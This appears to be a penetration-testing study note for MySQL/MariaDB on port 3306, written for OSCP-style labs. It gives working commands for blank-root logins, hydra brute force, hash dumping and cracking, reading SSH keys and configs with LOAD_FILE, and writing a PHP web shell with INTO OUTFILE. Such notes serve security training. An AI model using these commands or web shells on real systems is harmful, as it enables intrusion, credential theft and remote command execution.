# 🔧 MySQL / MariaDB — Port 3306

> **Open-source relational database** (3306/TCP, frequently bound to `127.0.0.1` — visible only after a foothold or port-forward). Auth is user+password with host-scoping (`user@host`). On OSCP this is mostly a **credential and file surface**: weak/blank `root`, creds reused from web configs (`wp-config.php`, `.env`), reading local files with `LOAD_FILE`, writing web shells with `INTO OUTFILE` (gated by `FILE` priv + `@@secure_file_priv`), and occasionally UDF-based command execution. Cracked DB creds frequently unlock SSH.

Related: [[Credential Attacks]] · [[HTTP]] · [[SSH]] · [[Linux Privilege Escalation]] · [[Shells]]

---

## 🧠 PORT 3306 → THINK
- **Try blank/weak `root`** and any creds you found in web configs.
- Creds in `wp-config.php` / `.env` / `config.php` → **reuse here** and on [[SSH]].
- Logged in as high-priv → **`LOAD_FILE`** (read files) and **`INTO OUTFILE`** (write web shell).
- Version banner → known auth-bypass CVEs on old builds (verify, don't assume).
- Often bound to localhost — reachable only after a foothold → then it holds the app's secrets.

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
nmap -p3306 -sV --script mysql-info,mysql-empty-password $IP
```

```bash
mysql -h $IP -u root                    # blank root
```

```bash
mysql -h $IP -u root -p'root'           # weak root (no space after -p)
```
**Verdict:** login works → enumerate DBs / try file read-write. Fails → spray reused creds; note version for CVEs.

## ⏱️ ENUMERATE
```bash
nmap -p3306 --script mysql-info,mysql-empty-password,mysql-users,mysql-databases $IP
```

```bash
mysql -h $IP -u root -p'password' -e "
```

```bash
SELECT version();
```

```bash
SELECT current_user();
```

```bash
SHOW databases;
```

```bash
SELECT user,authentication_string,host FROM mysql.user;   -- hashes to crack
```

```bash
SELECT @@secure_file_priv;                                -- '' or NULL controls OUTFILE/LOAD_FILE
```

```bash
"
```

```bash
# Dump interesting tables
mysql -h $IP -u root -p'password' -e "SELECT * FROM appdb.users;"
```

```bash
# Crack MySQL creds against a wordlist (only if lockout not a concern)
hydra -L users.txt -P rockyou.txt mysql://$IP
```
**Look for:** app databases (users tables with password hashes), `mysql.user` hashes, `@@secure_file_priv` empty (→ file read/write allowed), FILE privilege, a writable webroot for OUTFILE.
> Host-scoping: an account may work from `localhost` but not remotely (`user@'%'` vs `user@'localhost'`).

## 🗡️ EXPLOIT
- 🟢 **Weak/blank/reused creds** → login → dump secrets → reuse ([[Credential Attacks]]).
- 🟢 **`INTO OUTFILE` web shell** (FILE priv + writable webroot) → RCE.
- 🟢 **`LOAD_FILE`** sensitive files → creds/keys.
- 🟡 **Crack `mysql.user` hashes** offline (hashcat).
- 🔵 **UDF command execution** (`lib_mysqludf_sys`) — needs write to plugin dir; situational/advanced.
- 🔵 **Version-specific auth bypass** on old MySQL/MariaDB — confirm exact version, don't assume.

**A) Web shell via OUTFILE (RCE)** — needs `FILE` priv, `@@secure_file_priv` empty/permissive, writable + web-served path:
```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';
-- then browse: http://$IP/s.php?c=id   -> command execution
```
**B) File read for creds:**
```sql
SELECT LOAD_FILE('/home/user/.ssh/id_rsa');   -- key -> ssh -i
SELECT LOAD_FILE('/var/www/html/config.php');  -- more creds
```
**C) Crack extracted hashes → login elsewhere:**
```bash
hashcat -m 300 mysql_hashes.txt rockyou.txt    # MySQL 4.1+ (SHA1-based)
```
**After access:** web shell (RCE), SSH via recovered key/cred, or fresh creds for the reuse matrix. Dump all user tables → crack → reuse on SSH/web/other DBs; `LOAD_FILE('/etc/passwd')` to map users; if MySQL runs as root and you have a local shell → check UDF for [[Linux Privilege Escalation]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| Blank/weak root | Full DB | dump + file ops | secrets/RCE |
| `@@secure_file_priv=''` | File ops allowed | LOAD_FILE / OUTFILE | read/RCE |
| FILE priv + webroot writable | Web shell | INTO OUTFILE `.php` | RCE |
| Password hashes in tables | Crackable | hashcat → reuse | logins |
| Creds match a system user | Reuse | ssh that user | shell |
| Creds only from web config | Reuse chain | login here + SSH | lateral |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Login denied remotely | Account may be `@localhost` — port-forward after foothold ([[Pivoting and Port Forwarding]]); try other creds |
| `secure_file_priv` set to a dir | OUTFILE only into that dir — check if it's web-served; else no file write |
| No FILE privilege | Can't read/write files — focus on dumping data + cracking hashes |
| OUTFILE "access denied" | Wrong/unwritable path — find real webroot via [[HTTP]]; try `INTO DUMPFILE` |
| Can't reach 3306 at all | Likely localhost-bound — get a foothold first, then local `mysql -h 127.0.0.1` |
| Hashes won't crack | Bigger wordlist/rules; pivot to file read for cleartext configs |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** not reusing **web-config DB creds** here and on SSH · forgetting the **no-space `-p'pass'`** syntax (space prompts interactively) · attempting OUTFILE without confirming **`@@secure_file_priv`** and the **real webroot** · ignoring MySQL because it's **localhost-only** (after a foothold it's a goldmine) · assuming a CVE applies without checking the **exact version**.
**Reuse:** DB creds & cracked hashes → [[SSH]], web logins ([[HTTP]]), other DBs; web config on the box → DB creds here; dumped user tables → creds for the whole target. See [[Credential Attacks]].
**Don't miss:** blank/weak `root` + reused web-config creds · `SELECT * FROM mysql.user` (hashes) · `@@secure_file_priv` + FILE privilege · `LOAD_FILE` sensitive files · `INTO OUTFILE` web shell (right webroot) · crack hashes → reuse on SSH · revisit localhost MySQL after any foothold.
**Stop when:** no creds work, file privileges absent, and nothing dumpable/crackable → exhausted for now; revisit after a foothold (localhost binding) or with creds found elsewhere. With a web shell or reusable creds, work moves to [[Shells]] / [[Linux Privilege Escalation]].

## 📇 CHEAT SHEET
```bash
nmap -p3306 --script mysql-info,mysql-empty-password,mysql-users,mysql-databases $IP
```

```bash
mysql -h $IP -u root                    # blank
```

```bash
mysql -h $IP -u root -p'pass' -e "SHOW databases; SELECT user,authentication_string FROM mysql.user;"
```

```bash
mysql -h $IP -u root -p'pass' -e "SELECT LOAD_FILE('/etc/passwd');"                  # read
```

```bash
mysql -h $IP -u root -p'pass' -e "SELECT '<?php system(\$_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php';"  # write shell
```

```bash
hashcat -m 300 hashes.txt rockyou.txt   # crack MySQL hashes
```
**Kill shots:** reused creds → dump/crack → SSH · FILE priv → OUTFILE web shell → RCE · LOAD_FILE → keys/creds.
